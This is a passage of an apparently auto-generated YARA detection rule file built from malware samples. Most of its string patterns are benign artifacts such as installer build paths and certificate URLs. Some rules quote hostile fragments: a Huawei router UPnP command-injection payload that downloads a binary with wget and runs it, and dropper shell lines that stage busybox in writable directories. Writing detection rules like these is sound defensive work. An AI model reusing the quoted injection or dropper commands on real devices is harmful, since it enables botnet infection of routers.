      $s6 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\secureobj.cpp" fullword ascii
      $s7 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\closeapps.cpp" fullword ascii
      $s8 = "c:\\agent\\_work\\66\\s\\src\\libs\\wcautil\\wcalog.cpp" fullword ascii
      $s9 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\xmlfile.cpp" fullword ascii
      $s10 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\test.cpp" fullword ascii
      $s11 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\osinfo.cpp" fullword ascii
      $s12 = "c:\\agent\\_work\\66\\s\\src\\libs\\dutil\\rmutil.cpp" fullword ascii
      $s13 = "C:\\agent\\_work\\66\\s\\build\\ship\\x86\\wixca.pdb" fullword ascii
      $s14 = "c:\\agent\\_work\\66\\s\\src\\libs\\dutil\\fileutil.cpp" fullword ascii
      $s15 = "c:\\agent\\_work\\66\\s\\src\\libs\\dutil\\xmlutil.cpp" fullword ascii
      $s16 = "c:\\agent\\_work\\66\\s\\src\\libs\\dutil\\procutil.cpp" fullword ascii
      $s17 = "c:\\agent\\_work\\66\\s\\src\\libs\\dutil\\proc2utl.cpp" fullword ascii
      $s18 = "c:\\agent\\_work\\66\\s\\src\\libs\\dutil\\memutil.cpp" fullword ascii
      $s19 = "c:\\agent\\_work\\66\\s\\src\\libs\\dutil\\strutil.cpp" fullword ascii
      $s20 = "c:\\agent\\_work\\66\\s\\src\\libs\\dutil\\aclutil.cpp" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 11000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219_394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0_12 {
   meta:
      description = "evidences - from files 0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219.msi, 394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba.msi, 4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312.msi, 4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38.msi, 50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b.msi, 5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2.msi, 635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a.msi, 637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61.msi, 66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352.msi, 67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73.msi, 702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37.msi, 781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143.msi, 871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857.msi, 91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624.msi, 98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585.msi, 99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1.msi, be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8.msi, ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62.msi, d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd.msi, e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778.msi, f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219"
      hash2 = "394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba"
      hash3 = "4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312"
      hash4 = "4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38"
      hash5 = "50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b"
      hash6 = "5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2"
      hash7 = "635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a"
      hash8 = "637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61"
      hash9 = "66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352"
      hash10 = "67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73"
      hash11 = "702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37"
      hash12 = "781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143"
      hash13 = "871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857"
      hash14 = "91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624"
      hash15 = "98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585"
      hash16 = "99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1"
      hash17 = "be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8"
      hash18 = "ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62"
      hash19 = "d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd"
      hash20 = "e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778"
      hash21 = "f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67"
   strings:
      $s1 = "* lJgvJ" fullword ascii
      $s2 = "!\"* 9GaC" fullword ascii
      $s3 = "RrUX@OX\\N" fullword ascii
      $s4 = "ZTIK; `" fullword ascii
      $s5 = "SDjk6&^" fullword ascii
      $s6 = "SnxHcqL" fullword ascii
      $s7 = "idzYP\\" fullword ascii
      $s8 = "LaTp.55" fullword ascii
      $s9 = "Gf.dri" fullword ascii
      $s10 = "SnrW\\z" fullword ascii
      $s11 = "ovDqq-6?" fullword ascii
      $s12 = "FSkAq:n" fullword ascii
      $s13 = "hzaYSoZ" fullword ascii
      $s14 = "\\kf[_S" fullword ascii
      $s15 = "\\^!)?m#g" fullword ascii
      $s16 = "7lZ(xya" fullword ascii
      $s17 = "3}q[vQ" fullword ascii
      $s18 = "%z5VNH" fullword ascii
      $s19 = "wOsT:_" fullword ascii
      $s20 = "I:_W#w" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 27000KB and ( 8 of them )
      ) or ( all of them )
}

rule _5bd80b8c921f711dc57402c208b47e80a273379879f5a060c6bbffaea4a20ceb_8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663_13 {
   meta:
      description = "evidences - from files 5bd80b8c921f711dc57402c208b47e80a273379879f5a060c6bbffaea4a20ceb.elf, 8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663868f6f.elf, a7e6c20d68c9846d9f17a511bcbbda10d808e2169dc521599ce2cb962ac9579e.elf, b01388431330e30201aa326c75da6715aed4934ed3b7fb1221683aa0bb8eab09.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "5bd80b8c921f711dc57402c208b47e80a273379879f5a060c6bbffaea4a20ceb"
      hash2 = "8d86880f5b60f4981c133ea2ce82f779965156fb0e25bd9e37fa986663868f6f"
      hash3 = "a7e6c20d68c9846d9f17a511bcbbda10d808e2169dc521599ce2cb962ac9579e"
      hash4 = "b01388431330e30201aa326c75da6715aed4934ed3b7fb1221683aa0bb8eab09"
   strings:
      $s1 = "Remote I/O error" fullword ascii
      $s2 = "Protocol error" fullword ascii /* Goodware String - occured 26 times */
      $s3 = "Protocol not supported" fullword ascii /* Goodware String - occured 73 times */
      $s4 = "Connection refused" fullword ascii /* Goodware String - occured 127 times */
      $s5 = "Broken pipe" fullword ascii /* Goodware String - occured 742 times */
      $s6 = "Permission denied" fullword ascii /* Goodware String - occured 823 times */
      $s7 = "Structure needs cleaning" fullword ascii
      $s8 = "hlLjztqZ" fullword ascii
      $s9 = "Not a XENIX named type file" fullword ascii
      $s10 = "Wrong medium type" fullword ascii
      $s11 = "No XENIX semaphores available" fullword ascii
      $s12 = "Unknown error " fullword ascii /* Goodware String - occured 1 times */
      $s13 = "npxXoudifFeEgGaACScs" fullword ascii
      $s14 = "Is a named type file" fullword ascii
      $s15 = "/proc/" fullword ascii /* Goodware String - occured 1 times */
      $s16 = "Interrupted system call should be restarted" fullword ascii
      $s17 = "Streams pipe error" fullword ascii /* Goodware String - occured 2 times */
      $s18 = "Can not access a needed shared library" fullword ascii /* Goodware String - occured 3 times */
      $s19 = "Invalid cross-device link" fullword ascii /* Goodware String - occured 3 times */
      $s20 = "Bad font file format" fullword ascii /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b_b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b10_14 {
   meta:
      description = "evidences - from files 27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b.msi, b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b.exe"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b"
      hash2 = "b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b"
   strings:
      $s1 = "Microsoft.Deployment.WindowsInstaller.dll" fullword ascii
      $s2 = "Failed to locate functions in mscoree.dll (Error code %d). This custom action requires the .NET Framework to be installed." fullword wide
      $s3 = "\\Microsoft.Deployment.WindowsInstaller.dll" fullword wide
      $s4 = "Failed to get module path -- path is too long." fullword wide
      $s5 = "SfxCA.dll" fullword wide
      $s6 = "Ensure that the proper version of the .NET Framework is installed, or that there is a matching supportedRuntime element in Custo" wide
      $s7 = "Failed to create new CA process via RUNDLL32. Error code: %d" fullword wide
      $s8 = "Failed to get exit code of CA process. Error code: %d" fullword wide
      $s9 = "Failed to get temp directory. Error code %d" fullword wide
      $s10 = "http://www.digicert.com/CPS0" fullword ascii
      $s11 = "Failed to create communication pipe for new CA process. Error code: %d" fullword wide
      $s12 = "Failed to open communication pipe for new CA process. Error code: %d" fullword wide
      $s13 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii
      $s14 = "Failed to get method %s. Error code 0x%X" fullword wide
      $s15 = "RUNDLL32 returned error code: %d" fullword wide
      $s16 = "Failed to get module path. Error code %d." fullword wide
      $s17 = "http://ocsp.digicert.com0\\" fullword ascii
      $s18 = "Failed to wait for CA process. Error code: %d" fullword wide
      $s19 = "Failed to create temp directory. Error code %d" fullword wide
      $s20 = "Extracting custom action to temporary directory: %s\\" fullword wide
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 16000KB and ( 8 of them )
      ) or ( all of them )
}

rule _412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c_d0b0559d4aa385410bed5a7409a03bb2d35fa461ce61d9bc5eb2469178_15 {
   meta:
      description = "evidences - from files 412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c.elf, d0b0559d4aa385410bed5a7409a03bb2d35fa461ce61d9bc5eb2469178b0e1e9.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c"
      hash2 = "d0b0559d4aa385410bed5a7409a03bb2d35fa461ce61d9bc5eb2469178b0e1e9"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s2 = "in/busybox wget -g %d.%d.%d.%d -l /tmp/.vs -r /1; /bin/busybox chmod 777 /tmp/.vs; /tmp/.vs huawei.selfrep)</NewStatusURL><NewDo" ascii
      $s3 = "#GET /dlr.%s HTTP/1.1" fullword ascii
      $s4 = "User-Agent: wget (dlr)" fullword ascii
      $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1" fullword ascii
      $s6 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(rm -rf /tmp/*;" ascii
      $s7 = "Host: 127.0.0.1" fullword ascii
      $s8 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s9 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/" ascii
      $s10 = "wnloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii
      $s11 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii
      $s12 = "eviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a25" ascii
      $s13 = "(SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s14 = "assword" fullword ascii
      $s15 = "sername" fullword ascii
      $s16 = "Error 4" fullword ascii
      $s17 = "Error 1" fullword ascii
      $s18 = "Error 3" fullword ascii
      $s19 = "%s.%s.dlr" fullword ascii
      $s20 = "Error 2" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b_a66d219a6e5a068edc5b3e06dc1412454ce69bac0419e43d4d8c0620ae_16 {
   meta:
      description = "evidences - from files 27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b.msi, a66d219a6e5a068edc5b3e06dc1412454ce69bac0419e43d4d8c0620ae3d79e8.exe, b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b.exe, fe6b1c9250d666713e5b1ceabcb9c1c5030556ea061bfcb3c8b1d91af45ba0dd.exe"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b"
      hash2 = "a66d219a6e5a068edc5b3e06dc1412454ce69bac0419e43d4d8c0620ae3d79e8"
      hash3 = "b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b"
      hash4 = "fe6b1c9250d666713e5b1ceabcb9c1c5030556ea061bfcb3c8b1d91af45ba0dd"
   strings:
      $s1 = "7http://cacerts.digicert.com/DigiCertAssuredIDRootCA.crt0E" fullword ascii
      $s2 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0" fullword ascii
      $s3 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii
      $s4 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0 " fullword ascii
      $s5 = "http://ocsp.digicert.com0X" fullword ascii
      $s6 = "Ihttp://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl0" fullword ascii
      $s7 = "Lhttp://cacerts.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crt0" fullword ascii
      $s8 = "DigiCert, Inc.1;09" fullword ascii
      $s9 = "DigiCert Timestamp 20240" fullword ascii
      $s10 = "DigiCert Trusted Root G40" fullword ascii /* Goodware String - occured 1 times */
      $s11 = "]J<0\"0i3" fullword ascii /* Goodware String - occured 1 times */
      $s12 = "DigiCert1 0" fullword ascii
      $s13 = "v=Y]Bv" fullword ascii /* Goodware String - occured 1 times */
      $s14 = "2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA" fullword ascii
      $s15 = "2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA0" fullword ascii
      $s16 = "ymIXa+" fullword ascii
      $s17 = "220323000000Z" fullword ascii
      $s18 = "240926000000Z" fullword ascii
      $s19 = "351125235959Z0B1" fullword ascii
      $s20 = "220801000000Z" fullword ascii
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219_27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd_17 {
   meta:
      description = "evidences - from files 0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219.msi, 27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b.msi, 3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5.msi, 394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba.msi, 4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312.msi, 4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38.msi, 50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b.msi, 5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2.msi, 635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a.msi, 637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61.msi, 66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352.msi, 67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73.msi, 6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea11d334.msi, 702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37.msi, 781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143.msi, 871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857.msi, 91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624.msi, 98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585.msi, 99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1.msi, b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b.exe, be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8.msi, ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62.msi, cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891.msi, d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd.msi, e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778.msi, f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67.msi"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219"
      hash2 = "27f1cdf3422c4c87d9d273a62df4404339119e416d16d8512479d87acd07c12b"
      hash3 = "3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5"
      hash4 = "394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba"
      hash5 = "4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312"
      hash6 = "4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38"
      hash7 = "50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b"
      hash8 = "5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2"
      hash9 = "635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a"
      hash10 = "637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61"
      hash11 = "66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352"
      hash12 = "67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73"
      hash13 = "6fd94d7c31b11fcd1a581d521faa61482d7543218fe33119b889f206ea11d334"
      hash14 = "702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37"
      hash15 = "781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143"
      hash16 = "871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857"
      hash17 = "91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624"
      hash18 = "98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585"
      hash19 = "99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1"
      hash20 = "b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b"
      hash21 = "be5a6ccac39cc436ff3447106328ef8ddc782f4a66aa192569dfb94d31b568d8"
      hash22 = "ccdaed5b9dc02565ca4beac1f8bb971b23077363408a7887855581eb228acb62"
      hash23 = "cfd788fb51b1e5176f46426ac640b732d71f94fc2d276bb3d7c251fa5e82a891"
      hash24 = "d25bd44f8eeb55687e65eaca4aad93c89d2cce5983b28420bacb605fd6a0a1cd"
      hash25 = "e59be80da8616abb570739f259b2bc5b6ed8c0821803fa6517a13f836caa4778"
      hash26 = "f7e421c9631cf5f9fdc61def4806054cf95c31d07834ba6cb6eeae8d1c847f67"
   strings:
      $s1 = "Root Entry" fullword wide /* Goodware String - occured 46 times */
      $s2 = "SummaryInformation" fullword wide /* Goodware String - occured 50 times */
      $s3 = "B4FhD&B" fullword ascii /* Goodware String - occured 1 times */
      $s4 = "E(?(E8B" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "ExE(;2D" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "Intel;1033" fullword ascii
      $s7 = "@H??wElDj;" fullword ascii /* Goodware String - occured 1 times */
      $s8 = ";;B&F7B" fullword ascii /* Goodware String - occured 1 times */
      $s9 = "DrDhD7H" fullword ascii /* Goodware String - occured 1 times */
      $s10 = "Installation Database" fullword ascii
      $s11 = "@H??wElDj>" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 27000KB and ( 8 of them )
      ) or ( all of them )
}

rule _412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c_5bd80b8c921f711dc57402c208b47e80a273379879f5a060c6bbffaea4_18 {
   meta:
      description = "evidences - from files 412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c.elf, 5bd80b8c921f711dc57402c208b47e80a273379879f5a060c6bbffaea4a20ceb.elf, d0b0559d4aa385410bed5a7409a03bb2d35fa461ce61d9bc5eb2469178b0e1e9.elf"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "412832991c8007de0898d44f724cff80eb5bb60b4082ced5335e0aa7b5d8ec2c"
      hash2 = "5bd80b8c921f711dc57402c208b47e80a273379879f5a060c6bbffaea4a20ceb"
      hash3 = "d0b0559d4aa385410bed5a7409a03bb2d35fa461ce61d9bc5eb2469178b0e1e9"
   strings:
      $s1 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s2 = "HOST: 255.255.255.255:1900" fullword ascii
      $s3 = "service:service-agent" fullword ascii
      $s4 = "ST: urn:dial-multiscreen-org:service:dial:1" fullword ascii
      $s5 = " default" fullword ascii
      $s6 = "Windows XP" fullword ascii /* Goodware String - occured 134 times */
      $s7 = ".mdebug.abi32" fullword ascii
      $s8 = "TeamSpeak" fullword ascii
      $s9 = "google" fullword ascii /* Goodware String - occured 1 times */
      $s10 = ".data.rel.ro" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "objectClass0" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _20a567a487c0f14bef235ee94c363bcdffc79dce6b82e3ed73e0455d2dc51a23_b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b10_19 {
   meta:
      description = "evidences - from files 20a567a487c0f14bef235ee94c363bcdffc79dce6b82e3ed73e0455d2dc51a23.apk, b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b.exe"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "20a567a487c0f14bef235ee94c363bcdffc79dce6b82e3ed73e0455d2dc51a23"
      hash2 = "b0a8d541b650ffff1bb4b3690af389e52b1675212129560dbe33038b1041266b"
   strings:
      $s1 = "actions" fullword ascii /* Goodware String - occured 63 times */
      $s2 = "Program" fullword ascii /* Goodware String - occured 194 times */
      $s3 = "Update" fullword ascii /* Goodware String - occured 460 times */
      $s4 = "Default" fullword ascii /* Goodware String - occured 912 times */
      $s5 = "Delete" fullword ascii /* Goodware String - occured 1948 times */
   condition:
      ( ( uint16(0) == 0x4b50 or uint16(0) == 0x5a4d ) and filesize < 16000KB and ( all of them )
      ) or ( all of them )
}

rule _259fbba0631e74d7bf4df80e80374e834d716a18f8eec97150f956327ac3f830_50afe9a363f239c78c6b725fddf37c2911dcb8076c548e44499e6dd87b_20 {
   meta:
      description = "evidences - from files 259fbba0631e74d7bf4df80e80374e834d716a18f8eec97150f956327ac3f830.sh, 50afe9a363f239c78c6b725fddf37c2911dcb8076c548e44499e6dd87bd34def.sh"
      author = "Sameer P Sheik IBM"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-07"
      hash1 = "259fbba0631e74d7bf4df80e80374e834d716a18f8eec97150f956327ac3f830"
      hash2 = "50afe9a363f239c78c6b725fddf37c2911dcb8076c548e44499e6dd87bd34def"
   strings:
      $s1 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s2 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s3 = ">/var/tmp/.a && cd /var/tmp;" fullword ascii
      $s4 = ">/home/.a && cd /home;" fullword ascii
      $s5 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii
      $s6 = ">/tmp/.a && cd /tmp;" fullword ascii
      $s7 = ">/dev/shm/.a && cd /dev/shm;" fullword ascii
      $s8 = ">/dev/.a && cd /dev;" fullword ascii
      $s9 = ">/var/.a && cd /var;" fullword ascii
      $s10 = "f; # ; rm -rf .f;" fullword ascii
      $s11 = "echo \"$0 FIN\";" fullword ascii
   condition:
      ( uint16(0) == 0x2f3e and filesize < 6KB and ( 8 of them )
      ) or ( all of them )
}

rule _0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219_3167204da48c382798d7455267b1791168008f93592b6794d304b27903_21 {
   meta:
      description = "evidences - from files 0b89d9792688fb3de9b164302ffc53d73c63a8ac10164cd75a066df9bbb66219.msi, 3167204da48c382798d7455267b1791168008f93592b6794d304b27903fb37e5.msi, 394ba6d5a7de793c75100dd0a56d523d950788585febe473de778de1a0a6f3ba.msi, 4174efe81d6c282386c7a659f5f696ded961fd874b4ef6e937c126616c351312.msi, 4d42ec12fd0d834bf8be2ce43561464cb4722bb68550278546ae3de03569cf38.msi, 50f1c3fd9157cad099bb9fa20c81bd975b516e3bbe31f4d36dfa8d21cb4db08b.msi, 5576c7b2a2408bd5812580d6ffdf7fa7e8662dd2ed93af905b09e7047cf043e2.msi, 635c7a05d7626d972c8f2e5ba73f866487de27a71409c457dcc1b804f004951a.msi, 637cddc88e13207eb5459a0107c77195b934d52d4bc1e62a71ca810554936b61.msi, 66edb872fde436ff7ac37f72bff3b44cdaaf7f08b23147fdc45bd215ccb51352.msi, 67b3fbe53bb0d84a4994afee73ab3023f4472cdb361770d21df6916fd0d2ba73.msi, 702947a51ae8e75ea2ca5835aabdf2d24e05f97e3889799327f15f124c4f3b37.msi, 781db8817945199f0bf801d7be8b3e8c9b71cceac489bb321a8249debc009143.msi, 871f0b26ba96c5f3921e2823ed80d0c3439cb75fa9fff75bc1c989aa473be857.msi, 91e3f43d76c2400eafb518961a0bc8044012c3febd870e88e153667bddda4624.msi, 98b5e11eb002a610d982b4c8e42fe588210e6b88e573c55dbf1cb1a7dc1be585.msi, 99a0c8f6c446391b9f8838f286485d41cd28929cc023ce54e4957e001c8858a1.msi, 